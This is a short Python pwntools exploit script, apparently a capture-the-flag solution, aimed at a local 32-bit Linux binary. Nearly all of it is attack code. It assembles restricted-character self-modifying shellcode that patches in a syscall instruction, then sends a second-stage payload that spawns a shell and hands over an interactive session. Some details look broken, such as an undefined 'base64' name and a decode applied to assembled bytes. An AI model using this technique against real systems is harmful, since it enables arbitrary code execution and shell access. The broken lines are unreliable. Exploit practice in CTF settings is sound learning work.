from pwn import *
from base64 import b64decode

p = process("./pwn")
context(arch = 'i386', os = 'linux', endian = 'little')
# target is read(0 , &sc , N) (N > len(code1) + len(code2))
# pop ebx # not
# inc eax # not
code1 = '''
push eax
pop edx /* edx -> sc */
push ebx
pop eax
dec eax /* eax = 0xffff */
xor ax, 0x4f65
push eax
pop ecx
push edx
pop eax /* eax -> sc */
xor [eax+0x30], ecx /* int 0x80 */
push eax
pop ecx /* ecx -> sc */
inc ebx
inc ebx
inc ebx
push ebx
pop eax
dec ebx
dec ebx
dec ebx
'''

# code1 = asm(code1)
# code1 = code1.ljust(0x30 , "0")
# code1 += "\x57\x3000"
sc = asm(code1)
# print(code1)
print(sc)
scc = sc.ljust(0x30, "O") + "\x57\x30OO"
final = base64.b64decode(scc)

p.sendline(final + "\x00")
shellcode = "a" * 0x32 + asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()

